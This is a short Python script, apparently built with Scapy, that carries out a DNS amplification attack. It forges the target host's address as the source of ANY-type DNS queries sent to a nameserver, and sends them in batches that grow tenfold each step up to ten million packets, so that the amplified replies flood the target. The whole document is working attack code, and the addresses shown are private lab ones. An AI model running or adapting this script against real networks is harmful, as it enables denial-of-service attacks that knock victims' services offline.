#!/usr/bin/env python
from scapy.all import DNS, DNSQR, IP, send, UDP, DNSRROPT
import numpy as np
import time 
import random 

random.seed(1313)
random.randint(0,255)

target = "10.0.0.238"  # Target host
nameserver = "10.0.0.183"  # DNS server
domain = "google.com"  # Some domain name like "google.com" etc.


ip = IP(dst=nameserver, src=target)
udp = UDP(dport=53)
dns = DNS(id = random.randint(0,255), rd=1, qd=DNSQR(qname=domain, qtype=255), an=DNSRROPT(rdlen=12, rdata= []))



request = (ip/udp/dns)

# print(dns.show())







n_levels = 8
packets_level = []

for x in range(n_levels): 
    packets_level.append(1*(10**x))

total_packets_sent = 0

for j in packets_level: 
    req_list = []
    for i in range(j): 
        req_list.append(request)

    print(f'packets / second : {len(req_list)}') 


   
    answer = send(req_list, verbose=0)
    total_packets_sent += len(req_list)
    time.sleep(1) 

print(f'total_packets_sent = {total_packets_sent}')
